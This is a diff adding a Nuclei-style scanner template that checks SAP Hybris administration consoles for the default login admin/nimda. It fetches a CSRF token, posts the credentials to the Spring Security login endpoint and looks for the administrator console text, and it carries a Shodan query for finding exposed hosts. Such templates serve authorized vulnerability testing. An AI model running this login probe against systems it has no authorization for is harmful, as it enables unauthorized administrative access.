@@ -1,0 +1,62 @@
+id: hybris-default-login
+
+info:
+  name: Hybris Default Login
+  author: princechaddha
+  severity: high
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    shodan-query: title:"Hybris"
+  tags: default-login,hybris
+
+requests:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /j_spring_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}login
+
+        j_username={{username}}&j_password={{password}}&_csrf={{csrftoken}}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - nimda
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "hybris administration console"
+          - "You're Administrator"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: csrftoken
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - '<meta name="_csrf" content="([a-z0-9-]+)" \/>'
